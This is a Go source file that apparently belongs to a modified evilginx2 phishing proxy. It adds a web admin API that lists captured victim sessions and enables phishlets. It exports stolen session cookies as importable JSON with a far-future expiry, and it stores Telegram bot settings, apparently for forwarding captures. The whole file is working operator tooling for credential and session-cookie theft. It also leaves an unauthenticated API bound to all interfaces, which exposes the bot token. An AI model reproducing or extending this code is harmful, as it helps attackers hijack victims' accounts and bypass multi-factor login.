package core

import (
	"encoding/json"
	"fmt"
	"net/http"

	"github.com/kgretzky/evilginx2/database"
	"github.com/kgretzky/evilginx2/log"
	"strconv"
)

type WebAPI struct {
	db  *database.Database
	cfg *Config
	ns  *Nameserver
	hp  *HttpProxy
}

func NewWebAPI(db *database.Database, cfg *Config, ns *Nameserver, hp *HttpProxy) *WebAPI {
	return &WebAPI{
		db:  db,
		cfg: cfg,
		ns:  ns,
		hp:  hp,
	}
}

func (w *WebAPI) Start(port int) {
	mux := http.NewServeMux()

	// Example API Endpoints
	mux.HandleFunc("/", w.handleIndex)
	mux.HandleFunc("/api/sessions", w.handleSessions)
	mux.HandleFunc("/api/sessions/download", w.handleSessionDownload)
	mux.HandleFunc("/api/stats", w.handleStats)
	mux.HandleFunc("/api/config", w.handleConfig)
	mux.HandleFunc("/api/config/update", w.handleUpdateConfig)
	mux.HandleFunc("/api/phishlets/enable", w.handlePhishletEnable)
	mux.HandleFunc("/delete-all", w.handleDeleteAllSessions)
	mux.HandleFunc("/logout", w.handleLogout)

	// Settings Endpoints
	mux.HandleFunc("/get-telegram", w.handleGetTelegram)
	mux.HandleFunc("/settings/save", w.handleSaveTelegram)

	// Serve Static Files
	mux.Handle("/css/", http.StripPrefix("/css/", http.FileServer(http.Dir("web/css"))))
	mux.Handle("/js/", http.StripPrefix("/js/", http.FileServer(http.Dir("web/js"))))
	mux.Handle("/img/", http.StripPrefix("/img/", http.FileServer(http.Dir("web/img"))))

	log.Info("Starting Web Admin API at http://127.0.0.1:%d", port)
	go http.ListenAndServe(fmt.Sprintf(":%d", port), mux)
}

func (w *WebAPI) handleIndex(rw http.ResponseWriter, req *http.Request) {
	if req.URL.Path != "/" {
		http.NotFound(rw, req)
		return
	}
	http.ServeFile(rw, req, "web/index.html")
}

func (w *WebAPI) handleSessions(rw http.ResponseWriter, req *http.Request) {
	sessions, _ := w.db.ListSessions()
	rw.Header().Set("Content-Type", "application/json")
	json.NewEncoder(rw).Encode(sessions)
}

func (w *WebAPI) handleStats(rw http.ResponseWriter, req *http.Request) {
	sessions, _ := w.db.ListSessions()
	validCount := 0
	for _, s := range sessions {
		if len(s.CookieTokens) > 0 {
			validCount++
		}
	}
	stats := map[string]interface{}{
		"total":          len(sessions),
		"validCount":     validCount,
		"invalidCount":   len(sessions) - validCount,
		"visitPercent":   100,
		"visitTrend":     "bull",
		"validPercent":   100,
		"validTrend":     "bull",
		"invalidPercent": 0,
		"invalidTrend":   "bear",
	}
	rw.Header().Set("Content-Type", "application/json")
	json.NewEncoder(rw).Encode(stats)
}

func (w *WebAPI) handleConfig(rw http.ResponseWriter, req *http.Request) {
	configData := map[string]interface{}{
		"general": map[string]interface{}{
			"domain": w.cfg.GetServerBindIP(),
		},
	}
	rw.Header().Set("Content-Type", "application/json")
	json.NewEncoder(rw).Encode(configData)
}

func (w *WebAPI) handlePhishletEnable(rw http.ResponseWriter, req *http.Request) {
	if req.Method != http.MethodPost {
		http.Error(rw, "Method payload invalid", http.StatusBadRequest)
		return
	}

	var payload struct {
		Name string `json:"name"`
	}
	if err := json.NewDecoder(req.Body).Decode(&payload); err != nil {
		http.Error(rw, err.Error(), http.StatusBadRequest)
		return
	}

	phishlet, err := w.cfg.GetPhishlet(payload.Name)
	if err != nil {
		http.Error(rw, "Phishlet not found", http.StatusNotFound)
		return
	}

	err = w.cfg.SetSiteEnabled(payload.Name)
	if err != nil {
		http.Error(rw, "Failed to enable phishlet", http.StatusInternalServerError)
		return
	}

	// This correctly interfaces with Go's representation instead of spawning an eval shell in Node!
	log.Important("WebAPI: Enabled phishlet '%s'", phishlet.Name)

	rw.Header().Set("Content-Type", "application/json")
	json.NewEncoder(rw).Encode(map[string]string{"message": "Phishlet enabled"})
}

func (w *WebAPI) handleGetTelegram(rw http.ResponseWriter, req *http.Request) {
	rw.Header().Set("Content-Type", "application/json")
	json.NewEncoder(rw).Encode(map[string]string{
		"chatId":   w.cfg.GetTelegramChatID(),
		"botToken": w.cfg.GetTelegramBotToken(),
	})
}

func (w *WebAPI) handleSaveTelegram(rw http.ResponseWriter, req *http.Request) {
	if req.Method != http.MethodPost {
		http.Error(rw, "Method payload invalid", http.StatusBadRequest)
		return
	}

	var payload struct {
		ChatId   string `json:"chatId"`
		BotToken string `json:"botToken"`
	}
	if err := json.NewDecoder(req.Body).Decode(&payload); err != nil {
		http.Error(rw, "Invalid JSON payload", http.StatusBadRequest)
		return
	}

	w.cfg.SetTelegramChatID(payload.ChatId)
	w.cfg.SetTelegramBotToken(payload.BotToken)
	w.cfg.SetTelegramEnabled(true)

	// Hot-reload the live Telegram bot instance
	if w.hp != nil {
		w.hp.ReloadTelegramConfig()
	}

	rw.Header().Set("Content-Type", "application/json")
	json.NewEncoder(rw).Encode(map[string]string{"message": "✅ Telegram Settings Saved & Bot Reloaded"})
}

func (w *WebAPI) handleSessionDownload(rw http.ResponseWriter, req *http.Request) {
	idStr := req.URL.Query().Get("id")
	id, _ := strconv.Atoi(idStr)
	session, err := w.db.GetSessionById(id)
	if err != nil {
		http.Error(rw, "Session not found", http.StatusNotFound)
		return
	}

	cookieArray := []map[string]interface{}{}
	for domain, domainCookies := range session.CookieTokens {
		for name, cookie := range domainCookies {
			cookieName := name
			if cookie.Name != "" {
				cookieName = cookie.Name
			}
			cookieArray = append(cookieArray, map[string]interface{}{
				"name":           cookieName,
				"value":          cookie.Value,
				"domain":         domain,
				"path":           cookie.Path,
				"httpOnly":       cookie.HttpOnly,
				"secure":         cookie.Secure,
				"expirationDate": 1773674937, // Default far future expiration
			})
		}
	}

	rw.Header().Set("Content-Type", "application/json")
	rw.Header().Set("Content-Disposition", fmt.Sprintf("attachment; filename=cookies_%d.json", id))
	json.NewEncoder(rw).Encode(cookieArray)
}

func (w *WebAPI) handleDeleteAllSessions(rw http.ResponseWriter, req *http.Request) {
	if req.Method != http.MethodPost {
		http.Error(rw, "Method payload invalid", http.StatusBadRequest)
		return
	}

	sessions, _ := w.db.ListSessions()
	for _, s := range sessions {
		w.db.DeleteSessionById(s.Id)
	}

	rw.Header().Set("Content-Type", "application/json")
	json.NewEncoder(rw).Encode(map[string]string{"message": "✅ All sessions deleted successfully"})
}

func (w *WebAPI) handleLogout(rw http.ResponseWriter, req *http.Request) {
	// For now, just return success. If authentication is implemented later, clear session cookies here.
	rw.Header().Set("Content-Type", "application/json")
	json.NewEncoder(rw).Encode(map[string]string{"message": "Logged out"})
}

func (w *WebAPI) handleUpdateConfig(rw http.ResponseWriter, req *http.Request) {
	if req.Method != http.MethodPost {
		http.Error(rw, "Method invalid", http.StatusMethodNotAllowed)
		return
	}

	var payload struct {
		General struct {
			Domain           string `json:"domain"`
			UnauthUrl        string `json:"unauth_url"`
			TelegramBotToken string `json:"telegram_bot_token"`
			TelegramChatId   string `json:"telegram_chat_id"`
		} `json:"general"`
	}

	if err := json.NewDecoder(req.Body).Decode(&payload); err != nil {
		http.Error(rw, err.Error(), http.StatusBadRequest)
		return
	}

	if payload.General.Domain != "" {
		w.cfg.SetServerBindIP(payload.General.Domain)
	}
	if payload.General.UnauthUrl != "" {
		w.cfg.SetUnauthUrl(payload.General.UnauthUrl)
	}
	if payload.General.TelegramBotToken != "" {
		w.cfg.SetTelegramBotToken(payload.General.TelegramBotToken)
	}
	if payload.General.TelegramChatId != "" {
		w.cfg.SetTelegramChatID(payload.General.TelegramChatId)
	}

	rw.Header().Set("Content-Type", "application/json")
	json.NewEncoder(rw).Encode(map[string]string{"message": "✅ Configuration updated successfully"})
}
